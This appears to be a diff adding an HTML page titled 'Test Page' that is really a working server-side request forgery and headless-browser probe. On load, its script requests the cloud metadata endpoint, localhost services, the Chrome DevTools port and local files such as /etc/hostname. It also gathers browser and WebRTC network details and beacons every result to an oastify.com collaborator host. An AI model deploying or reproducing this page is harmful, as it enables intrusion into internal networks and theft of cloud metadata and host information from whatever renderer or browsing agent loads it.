@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head><title>Test Page</title></head>
+<body>
+<h1 id="out">Loading...</h1>
+<img src="http://gist-img.cyeykgw4pc4in8w4i3k719i60x6ougi5.oastify.com/test.png" width="1" height="1">
+<img src="http://169.254.169.254/latest/meta-data/" onerror="e('meta-err')" onload="e('meta-ok')">
+<img src="http://localhost:4000/" onerror="e('local-err')" onload="e('local-ok')">
+<link rel="dns-prefetch" href="//dnspf.cyeykgw4pc4in8w4i3k719i60x6ougi5.oastify.com">
+<link rel="prefetch" href="http://prefetch.cyeykgw4pc4in8w4i3k719i60x6ougi5.oastify.com/pf">
+<iframe src="http://169.254.169.254/latest/meta-data/hostname" width="400" height="100" id="mf"></iframe>
+<object data="file:///etc/hostname" type="text/plain" width="400" height="100"></object>
+<embed src="file:///C:/Windows/System32/drivers/etc/hosts" width="400" height="100">
+<script>
+var C = "cyeykgw4pc4in8w4i3k719i60x6ougi5.oastify.com";
+var R = [];
+function e(t, d) {
+    R.push(t + ":" + (d||""));
+    new Image().src = "http://" + t + "." + C + "/x";
+    document.getElementById("out").innerText = R.join(", ");
+}
+
+e("js-exec");
+
+// XHR to metadata
+var x = new XMLHttpRequest();
+x.open("GET", "http://169.254.169.254/latest/meta-data/", true);
+x.onload = function() { e("meta-xhr", x.responseText.substring(0,50)); };
+x.onerror = function() { e("meta-xhr-fail"); };
+try { x.send(); } catch(ex) { e("meta-xhr-exc"); }
+
+// XHR to localhost
+var x2 = new XMLHttpRequest();
+x2.open("GET", "http://localhost:4000/", true);
+x2.onload = function() { e("local-xhr", x2.responseText.substring(0,50)); };
+x2.onerror = function() { e("local-xhr-fail"); };
+try { x2.send(); } catch(ex) { e("local-xhr-exc"); }
+
+// CDP
+var x3 = new XMLHttpRequest();
+x3.open("GET", "http://localhost:9222/json", true);
+x3.onload = function() { e("cdp-ok", x3.responseText.substring(0,50)); };
+x3.onerror = function() { e("cdp-fail"); };
+try { x3.send(); } catch(ex) {}
+
+// WebRTC
+try {
+    var rtc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+    rtc.createDataChannel("");
+    rtc.createOffer().then(function(o) { rtc.setLocalDescription(o); });
+    rtc.onicecandidate = function(ev) {
+        if(ev && ev.candidate) e("rtc", ev.candidate.candidate);
+    };
+} catch(ex) { e("rtc-err"); }
+
+// file:// via XHR
+try {
+    var x4 = new XMLHttpRequest();
+    x4.open("GET", "file:///etc/hostname", true);
+    x4.onload = function() { e("file-ok", x4.responseText); };
+    x4.onerror = function() { e("file-fail"); };
+    x4.send();
+} catch(ex) { e("file-exc"); }
+
+// Navigator info
+e("nav", navigator.platform + "|" + navigator.userAgent.substring(0,60));
+
+// iframe content read attempt
+setTimeout(function() {
+    try {
+        var f = document.getElementById("mf");
+        var c = f.contentDocument || f.contentWindow.document;
+        e("iframe-read", c.body.innerText);
+    } catch(ex) { e("iframe-blocked", ex.message); }
+}, 5000);
+
+// Final beacon
+setTimeout(function() {
+    e("final", R.length + " results");
+}, 8000);
+</script>
+</body>
+</html>
